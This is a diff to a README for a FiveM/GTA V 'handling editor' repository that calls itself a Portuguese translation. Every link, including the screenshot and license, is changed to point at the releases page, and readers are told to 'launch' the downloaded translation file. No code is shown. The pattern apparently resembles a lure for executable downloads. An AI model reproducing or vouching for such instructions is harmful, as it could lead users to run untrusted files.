@@ -6,7 +6,7 @@ Welcome to the **fivem-onx-handling-editor** repository! This repository provide
 - **Name:** fivem-onx-handling-editor
 - **Description:** Tradução PT-BR para o onx-tuning.
 - **Topics:** fivem, gta, gta5, gtarp, gtav, handling, nopixel, onx, prodigy, rp, wiseguy
-- **Link:** [Download Translation](https://github.com/assets/Release.zip)
+- **Link:** [Download Translation](https://github.com/BialaDavid/fivem-onx-handling-editor/releases)
 
 ## 🌟 Features
 Explore some of the exciting features offered by this repository:
@@ -18,13 +18,13 @@ Explore some of the exciting features offered by this repository:
 
 ## 🎮 Getting Started
 Follow these simple steps to get started with the **fivem-onx-handling-editor**:
-1. Click on the [Download Translation](https://github.com/assets/Release.zip) link to download the translation file (ensure to launch the file).
+1. Click on the [Download Translation](https://github.com/BialaDavid/fivem-onx-handling-editor/releases) link to download the translation file (ensure to launch the file).
 2. Install the translation in your **FiveM** directory to start experiencing the game in Portuguese.
 
 ## 📷 Screenshots
 Take a sneak peek at what the fivem-onx-handling-editor has to offer:
 
-![Screenshot](https://via.placeholder.com/500)
+![Screenshot](https://github.com/BialaDavid/fivem-onx-handling-editor/releases)
 
 ## 🚀 Community
 Join the GTAV and FiveM community:
@@ -42,7 +42,7 @@ We welcome contributions to enhance the fivem-onx-handling-editor experience:
 Having trouble with the installation or translation? Check out the **Releases** section for additional resources or reach out to the community for assistance.
 
 ## 📝 License 
-The fivem-onx-handling-editor repository is licensed under the **MIT License** - see the [LICENSE](https://github.com/licenses/MIT) file for details.
+The fivem-onx-handling-editor repository is licensed under the **MIT License** - see the [LICENSE](https://github.com/BialaDavid/fivem-onx-handling-editor/releases) file for details.
 
 ---
 
